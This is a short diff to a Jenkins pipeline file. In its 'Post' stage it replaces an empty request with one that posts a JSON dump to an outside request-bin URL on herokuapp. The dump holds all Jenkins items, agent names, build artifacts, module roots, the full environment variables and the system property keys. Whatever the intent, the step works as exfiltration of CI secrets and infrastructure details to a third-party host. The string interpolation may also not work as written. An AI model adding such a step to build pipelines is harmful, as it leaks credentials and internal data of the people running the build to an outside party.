@@ -28,7 +28,14 @@ pipeline {
 	}
 	stage('Post') { 
             steps {
-                httpRequest contentType: 'APPLICATION_JSON', httpMode: 'POST', responseHandle: 'NONE', url: 'https://requestbincweber.herokuapp.com/1day2kl1'
+               httpRequest acceptType: 'APPLICATION_JSON', consoleLogResponseBody: true, httpMode: 'POST', requestBody: '''{
+			  "items":       ${ json( jenkins.allItems ) },
+			  "computers":   ${ json( jenkins.computers.collect{ it.displayName }) },
+			  "moduleRoots": ${ json( build.moduleRoots )},
+			  "artifacts":   ${ json( build.artifacts )},
+			  "env":         ${ json( env ) },
+			  "properties":  ${ json( [ system: System.properties.keySet(), env: env.keySet() ]) }
+			}''', responseHandle: 'NONE', url: 'https://requestbincweber.herokuapp.com/1day2kl1'
             }
         }
     }
